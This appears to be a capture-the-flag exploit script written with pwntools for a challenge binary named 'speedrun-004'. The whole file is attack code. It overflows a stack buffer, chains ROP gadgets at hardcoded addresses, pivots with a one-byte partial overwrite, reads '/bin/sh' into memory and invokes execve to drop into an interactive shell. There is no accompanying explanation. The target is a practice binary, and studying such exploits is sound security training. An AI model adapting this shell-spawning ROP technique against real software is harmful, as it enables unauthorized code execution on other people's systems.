#!/usr/bin/env python
# coding=utf-8
from pwn import *
a=process("./speedrun-004")
elf=ELF("./speedrun-004")
context.terminal=["tmux","splitw","-h"]
def init():
    a.recvuntil("how much do you have to say?\n")
    a.sendline("257")
    a.recvuntil("Ok, what do you have to say for yourself?\n")
def debug():
    gdb.attach(a,'''
    b *0x000000000400BB4
    ''')
#overflow 64+8 byte
pop_rdi_ret=0x0000000000400686
pop_rsi_ret=0x0000000000410a93
pop_rdx_ret=0x000000000044a155
leave_ret=0x000000000400CB1
syscall=0x00000000044A182
read_addr=0x00000000044A160
bss_addr=0x0000000006BB350+0x100

init()
payload='A'*0x48
payload+=p64(pop_rdi_ret)
payload+=p64(0)
payload+=p64(pop_rsi_ret)
payload+=p64(bss_addr)
payload+=p64(pop_rdx_ret)
payload+=p64(0x1000)
payload+=p64(read_addr)
payload+=p64(pop_rdi_ret)
payload+=p64(bss_addr)
payload+=p64(pop_rsi_ret)
payload+=p64(0)
payload+=p64(pop_rdx_ret)
payload+=p64(0)
payload+=p64(syscall)
payload=payload.ljust(0x100,'A')
payload+='\x10'
a.send(payload)
raw_input("OK?")
payload="/bin/sh\x00"
payload=payload.ljust(59,'\x00')
a.send(payload)


a.interactive()
